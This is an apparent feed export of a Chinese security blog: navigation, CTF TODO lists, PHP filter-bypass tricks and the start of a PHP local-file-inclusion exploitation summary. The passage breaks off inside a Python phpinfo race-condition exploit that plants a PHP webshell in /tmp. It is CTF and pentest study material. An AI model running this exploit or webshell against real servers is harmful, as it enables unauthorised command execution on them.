href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li><li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li><li><a href="/code_audit/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0">74CMS模板注入+文件包含getshell</a></li></ul><h1 id="流量分析"><strong>流量分析</strong></h1><ul><li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li><li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li><li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li></ul><h1 id="机器学习"><strong>机器学习</strong></h1><h2 id="基础学习">基础学习</h2><ul><li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li><li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li><li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li><li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li></ul><h1 id="Python"><strong>Python</strong></h1><h2 id="Python编程">Python编程</h2><ul><li><p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p></li><li><p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p></li><li><p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p></li><li><p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p></li><li><p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p></li><li><p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p></li></ul><h1 id="Java"><strong>Java</strong></h1><h2 id="Java编程">Java编程</h2><ul><li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li><li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li><li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li><li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li></ul><h1 id="算法"><strong>算法</strong></h1><h2 id="Leetcode">Leetcode</h2><ul><li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li></ul><h1 id="随笔"><strong>随笔</strong></h1><h2 id="经验">经验</h2><ul><li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li></ul><h2 id="技术">技术</h2><ul><li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li><li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li><li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li><li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li><li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文章归档&quot;&gt;&lt;a href=&quot;/archives/index.html&quot;&gt;&lt;strong&gt;文章归档&lt;/strong&gt;&lt;/a&gt;&lt;/h1&gt;
&lt;h1 id=&quot;置顶文章&quot;&gt;&lt;strong&gt;置顶文章&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;/Othe
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://ca0y1h.top/home/"/>
    <id>http://ca0y1h.top/home/</id>
    <published>2020-09-26T11:57:04.671Z</published>
    <updated>2020-11-06T04:13:34.182Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p><strong>ca01h@星盟安全</strong></p><p>NTExOTY1NzM4QHFxLmNvbQ==</p></blockquote><p>互联网时代的知识是零散的，需要有一个写字的地方，把零散的知识汇聚起来，以点连线，以线聚面，一方面能形成一个完整的知识体系，另一方面自己所需之时方便查阅，于是乎就诞生了<strong>ca01hの笔记本</strong>。</p><h2 id="TODO-LIST">TODO LIST</h2><h3 id="2020">2020</h3><p><strong>【未完成】SCTF复盘：<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p><p><strong>【未完成】<a href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p><h4 id="November">November</h4><ul><li><p><strong>【已完成】byteCTF2020 scrapy_redis复现</strong></p></li><li><p><strong>【未完成】未授权访问总结</strong></p></li><li><p>**【未完成】 <a href="https://www.m00nback.xyz/2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/">MySQL提权**</a></p></li><li><p><strong>【未完成】<a href="https://mp.weixin.qq.com/s/pD3ixjZJk-0vpFu3-e2x8Q">漏洞复现</a></strong></p></li><li><p><strong>【未完成】<a href="https://mp.weixin.qq.com/s/vzKtqXYFZRMcfq-ZGKuwfw">MKCMS5.0审计</a></strong></p></li><li><p><strong>【未完成】CTFShow刷题</strong></p></li><li><p><strong>【未完成】DataCon复盘（阶段二）</strong></p></li><li><p><strong>【未完成】ThinkPHP-vuln复现</strong></p></li></ul><h4 id="October">October</h4><ul><li><p><strong><s>【已完成】Yii2反序列化POP链分析</s></strong></p></li><li><p><s><strong>【已完成】<a href="https://www.gem-love.com/ctf/2634.html#babyback">巅峰极客Babyback复盘</a></strong></s></p></li><li><p><strong>【未完成】DataCon复盘（阶段二）</strong></p></li><li><p><strong>【未完成】星盟公开课准备工作</strong></p></li><li><p><s><strong>【已完成】论文开题报告</strong></s></p></li><li><p><s><strong>【已完成】xmctf出题</strong></s></p></li><li><p><s><strong>【已完成】CTFShow刷题</strong></s></p></li><li><p><s><strong>【已完成】HTB Doctor靶机</strong></s></p></li></ul><h4 id="September">September</h4><ul><li><s><strong>【已完成】实习+HW</strong></s></li><li><s><strong>【已完成】DataCon复盘（阶段一）</strong></s></li><li><s><strong>【已完成】2020巅峰极客CTF</strong></s></li></ul><h4 id="August">August</h4><ul><li><s><strong>【已完成】XCTF——WMCTF</strong>（有幸做了一个签到题</s></li><li><s><strong>【已完成】DataCon2020 DNS恶意流量分析</strong>（有幸混了一个鼓励奖</s><ul><li>DNS恶意域名分析<ul><li><a href="https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg">https://mp.weixin.qq.com/s/y0Wv5ci30HIhXp5bbCZxRg</a></li></ul></li><li>加密恶意流量检测<ul><li>初赛：<a href="https://s1mple.online/2020/08/09/DataCon2020-%E5%8A%A0%E5%AF%86%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%88%9D%E8%B5%9B-Writeup-%E5%8F%8A%E6%80%BB%E7%BB%93%E5%8F%8D%E6%80%9D/">https://s1mple.online/2020/08/09/DataCon2020-加密恶意流量检测初赛-Writeup-及总结反思/</a></li></ul></li><li>僵尸网络分析<ul><li>第一题：<a href="https://www.cdxy.me/?p=829">https://www.cdxy.me/?p=829</a></li><li>第三题：<a href="https://zhuanlan.zhihu.com/p/186948840">https://zhuanlan.zhihu.com/p/186948840</a></li></ul></li><li>网络黑产分析</li><li>恶意代码分析<ul><li><a href="https://github.com/yuriufo/DataCon2020">https://github.com/yuriufo/DataCon2020</a></li><li><a href="https://zhuanlan.zhihu.com/p/187535672">https://zhuanlan.zhihu.com/p/187535672</a></li><li><a href="https://zhuanlan.zhihu.com/p/185715807">https://zhuanlan.zhihu.com/p/185715807</a></li></ul></li></ul></li><li><s><strong>【已完成】首届钓鱼城杯CTF</strong></s></li><li><s><strong>【已完成】HW</strong></s></li><li><s><strong>【已完成】<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#htaccess">文件解析漏洞</a></strong></s></li><li><strong>【未完成】《机器学习实战》前七章</strong></li><li><s><strong>【已完成】BUUCTF刷题</strong></s></li><li><strong>【未完成】HackTheBox OpenKeys（账号又被封了。。。</strong></li><li><s><strong>【已完成】PHP构造反序列化链再学习</strong></s></li></ul><h4 id="July">July</h4><ul><li><p><s><strong>【已完成】第五空间CTF复盘</strong></s></p></li><li><p><s><strong>【已完成】DASCTF七月赛复盘</strong></s></p></li><li><p><strong><s>【已完成】CSICTF2020复盘</s></strong></p></li><li><p><s><strong>【已完成】2020电信天翼杯CTF</strong></s></p></li><li><p><strong>【未完成】SUCTF2019 Upload2</strong></p></li><li><p><strong>【未完成】N1CTF2018 Easy&amp;&amp;Hard PHP</strong></p><p><a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p><p><a href="https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499">https://github.com/wonderkun/CTF_web/tree/master/web600-1?1520941487499</a></p></li><li><p><strong>【未完成】<a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; Python 沙箱逃逸基础</a></strong></p></li><li><p>【<strong>未完成】<a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">PHP写配置漏洞</a></strong></p></li><li><p><strong>【未完成】<a href="https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/">PHP弱类型比较</a></strong></p></li><li><p><strong>【未完成】<a href="https://zeroyu.xyz/2020/06/04/Code-breaking-Puzzles-2018-Note">Code Breaking 2018挑战赛学习——正则回溯</a></strong></p></li><li><p><s><strong>【已完成】HackTheBox Tabby</strong></s></p></li><li><p><s><strong>【已完成】HackTheBox Sneakymailer</strong></s></p></li><li><p><strong>【未完成】Flask Pin码安全</strong></p></li></ul><h4 id="June">June</h4><ul><li><p><s>【已完成】<strong>RCTF2020</strong></s>（被完虐。。😭纯粹靠着队里的pwn师傅抬着走)</p></li><li><p><s>【已完成】<strong>PHP反序列化——Phar</strong></s></p></li><li><p><s>【已完成】<strong>PHP反序列化——Session</strong></s></p></li><li><p>【未完成】<strong>新春战役 Hackme</strong>：<a href="https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme">https://www.mrkaixin.top/posts/df9f633e/#5-0-hackme</a></p><ul><li><strong>filter_var绕过</strong>：<a href="https://www.secpulse.com/archives/67064.html">https://www.secpulse.com/archives/67064.html</a></li><li><strong>绕过四个字符限制getshell</strong>：<a href="https://www.anquanke.com/post/id/87203">https://www.anquanke.com/post/id/87203</a></li></ul></li><li><p><s>【已完成】<strong>PHP反序列化——Soapclient</strong></s></p><ul><li><strong>LCTF bestphp’s revenge</strong></li></ul></li><li><p><s>【未完成】<strong>PHP反序列化——字符逃逸</strong></s></p></li><li><p>【未完成】<a href="https://yanmymickey.github.io/2020/04/14/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/"><strong>PHP反序列化——Bypass</strong></a></p></li><li><p><s>【未完成】<strong>代码审计学习——PHP-Audit-Code Day1-6</strong></s></p></li><li><p>【未完成】<a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#GOPHER"><strong>phpinfo中的关键信息</strong></a></p></li><li><p>【未完成】<strong>Redis安全学习</strong></p></li><li><p><s>【已完成】<strong>BUUCTF刷题</strong></s></p></li><li><p><s>【已完成】<strong>XMCTF解题</strong></s></p></li><li><p><s>【已完成】<strong>第五空间CTF比赛（2020.06.24）</strong>（菜就一个字。。。）</s></p></li><li><p><s>【已完成】<strong>队内AWD训练赛（2020.06.28）</strong></s></p></li></ul><h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2><h3 id="Linux入侵检测">Linux入侵检测</h3><p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p><h3 id="红蓝对抗">红蓝对抗</h3><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p><a href="https://github.com/hudunkey/Red-Team-links">https://github.com/hudunkey/Red-Team-links</a></p><h3 id="代码审计">代码审计</h3><p><a href="https://github.com/CHYbeta/Code-Audit-Challenges">https://github.com/CHYbeta/Code-Audit-Challenges</a></p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs">https://github.com/hongriSec/PHP-Audit-Labs</a></p><h3 id="WAF">WAF</h3><p><a href="https://wh0ale.github.io/2019/12/04/waf%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0Bypass/">https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/</a></p><p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756">https://weibo.com/ttarticle/p/show?id=2309404007261092631700#_loginLayer_1579837230756</a></p><h3 id="java安全">java安全</h3><p><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></p><h3 id="Python安全">Python安全</h3><p><a href="https://github.com/bit4woo/python_sec">https://github.com/bit4woo/python_sec</a></p><h3 id="字典">字典</h3><p><a href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a></p><h3 id="求职">求职</h3><p><a href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p><p><a href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p><p><a href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p><h2 id="Bypass-Tricks">Bypass &amp; Tricks</h2><h3 id="PHP">PHP</h3><h4 id="preg-match绕过">preg_match绕过</h4><blockquote><p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p></blockquote><ul><li>数组绕过</li><li>PCRE回溯限制（code-breaking2018）</li><li>换行符</li></ul><h4 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h4><blockquote><p>参考文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p></blockquote><p>借用一张图简单地记一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p><h4 id="SSRF-file协议绕过">SSRF file协议绕过</h4><p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p><p>例题：<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p><h4 id="Session绕过">Session绕过</h4><p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p><p>例题：<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p><h4 id="利用数组绕过">利用数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure><p>例题：<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p><h4 id="basename绕过">basename绕过</h4><p>从 <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure><p>例题：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p><h4 id="htaccess利用">.htaccess利用</h4><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;wiki&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PHP LFI利用总结</title>
    <link href="http://ca0y1h.top/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://ca0y1h.top/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-09-21T02:17:16.000Z</published>
    <updated>2020-10-19T02:32:44.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-LFI利用总结">PHP LFI利用总结</h1><blockquote><p>参考文章：<a href="https://www.anquanke.com/post/id/177491">https://www.anquanke.com/post/id/177491</a></p></blockquote><h2 id="proc-self-environ">proc/self/environ</h2><p><strong>前置条件</strong></p><ul><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ul><p><strong>利用方式</strong></p><p>如果可以读取，修改<code>User-Agent</code>为php代码，然后lfi点包含，实现rce。</p><h2 id="proc-self-fd-1-2-3…">proc/self/fd/1,2,3…</h2><p><strong>前置条件</strong></p><ul><li><p>php以cgi方式运行。</p></li><li><p>environ文件存储位置已知，且environ文件可读。</p></li></ul><p>类似于<code>/proc/self/environ</code>，不同是在<code>referer</code>或报错等写入php代码，然后lfi点包含，实现rce。</p><h2 id="PHP伪协议">PHP伪协议</h2><h3 id="常用伪协议">常用伪协议</h3><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921104109.png" alt=""></p><h3 id="expect">expect://</h3><p><strong>前置条件</strong></p><ul><li>默认不开启，需要安装PECL package扩展</li><li>需要<code>allow_url_include</code>开启</li></ul><p><strong>利用方式</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expect:&#x2F;&#x2F;[command]</span><br></pre></td></tr></table></figure><h2 id="日志">日志</h2><h3 id="Apache日志">Apache日志</h3><p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p><p>CTF实例：</p><p><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two</a></p><h2 id="with-phpinfo">with phpinfo</h2><p>在可以访问phpinfo的情况下，疯狂上传大文件，同时在phpinfo中可以看到上传的文件在tmp目录下的文件名，条件竞争，在文件被删除之前包含进来getshell。</p><p>利用脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;</span><span class="string">&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php <span class="subst">$c</span>=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite(<span class="subst">$c</span>,&#x27;&lt;?php passthru(<span class="subst">$_GET</span>[&quot;</span>f<span class="string">&quot;]);?&gt;&#x27;);?&gt;r&quot;</span><span class="string">&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;</span><span class="string">&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>dummyname<span class="string">&quot;; filename=&quot;</span>test.txt<span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;</span><span class="string">&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;</span><span class="string">&quot;POST /phpinfo.php?a=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot; 